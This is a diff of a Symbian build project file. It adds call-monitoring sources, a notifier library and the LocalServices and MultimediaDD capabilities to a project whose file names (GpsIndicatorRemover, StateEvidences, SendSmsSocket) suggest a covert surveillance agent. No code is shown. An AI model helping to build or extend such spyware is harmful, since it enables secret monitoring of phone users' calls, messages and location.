@@ -17,7 +17,7 @@ END
 
 SOURCEPATH                              ..\src 
 
-SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp GpsIndicatorRemover.cpp
+SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp SlimMonitorPhoneCall.cpp MonitorFreeSpace.cpp GpsIndicatorRemover.cpp
 SOURCE AbstractAction.cpp AbstractState.cpp ActionFactory.cpp ActionNone.cpp ActionSms.cpp ActionSync.cpp ActionUninstall.cpp ActionLog.cpp Network.cpp Protocol.cpp SendSmsSocket.cpp ActionSyncApn.cpp
 SOURCE StateCmdUninstall.cpp StateNone.cpp
 SOURCE StateAuthentication.cpp StateIdentification.cpp StateEvidences.cpp StateBye.cpp 
@@ -69,12 +69,12 @@ LIBRARY HWRMLightClient.lib   				// for standby event
 LIBRARY apengine.lib						// for syncApn action  
 LIBRARY centralrepository.lib				
 LIBRARY featdiscovery.lib
-
+LIBRARY aknnotify.lib
 
 LIBRARY ezip.lib charconv.lib apmime.lib cryptography.lib imcm.lib hash.lib
 LIBRARY SharedQueueCli_20023633.lib // LIBRARY ActionsDLL_2002EF7E.lib
 
-capability   CommDD Location NetworkServices NetworkControl PowerMgmt ProtServ ReadDeviceData ReadUserData SurroundingsDD SwEvent TrustedUI UserEnvironment WriteDeviceData WriteUserData 
+capability   CommDD Location NetworkServices NetworkControl LocalServices PowerMgmt ProtServ ReadDeviceData ReadUserData SurroundingsDD SwEvent TrustedUI UserEnvironment WriteDeviceData WriteUserData MultimediaDD 
 
 //MACRO	_LOGGING
 
